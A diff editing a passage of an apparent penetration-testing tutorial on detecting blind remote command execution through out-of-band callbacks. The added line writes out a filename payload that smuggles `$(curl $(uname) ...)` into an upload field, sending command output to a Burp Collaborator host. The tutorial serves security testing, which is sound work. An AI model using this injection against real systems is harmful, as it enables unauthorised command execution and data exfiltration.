@@ -39,9 +39,9 @@ We send this out and hope for a hit. We poll for responses and see that we are g
 
 To confirm, we can extract content from the website. One way to do this is by adding a subdomain in Burp Collaborator. We'll type in "test123" to confirm that the request is actually coming from the web server we're attacking and not some random IP on the internet.
 
-We still want to make a cURL request, but instead of just sending a regular cURL request, we're also going to attach the results of our command as a DNS record. This means saying, "Hey, I want you to take the output of this command." In this case, we'll use "uname" and tell it to reach whatever the output of this command is as the record under this domain.
+We still want to make a cURL request, but instead of just sending a regular cURL request, we're also going to attach the results of our command as a DNS record. This means saying, "Hey, I want you to take the output of this command." In this case, we'll use "uname"   ( `filename="test123 $(curl $(uname) 1kmh59amqrfg17glhd9bawa56wcn0do2.oastify.com) .PNG"` )and tell it to reach whatever the output of this command is as the record under this domain.
 
-We request it, go back, poll for it, and see another HTTP request come in. Looking at the results, it says "Linux," which is likely the result of our "uname" command being attached to the DNS. This is a great technique when dealing with blind RCE.
+We request it, go back, poll for it, and see another HTTP request come in. Looking at the results, it says "Linux," which is likely the result of our "$(uname)" command being attached to the DNS. This is a great technique when dealing with blind RCE.
 
 By default, you should always try these cURL commands and have a server where you can monitor requests. This could be a Burp Collaborator, Netcat listener, or a subdomain you own. Having some way to monitor requests is crucial.
 
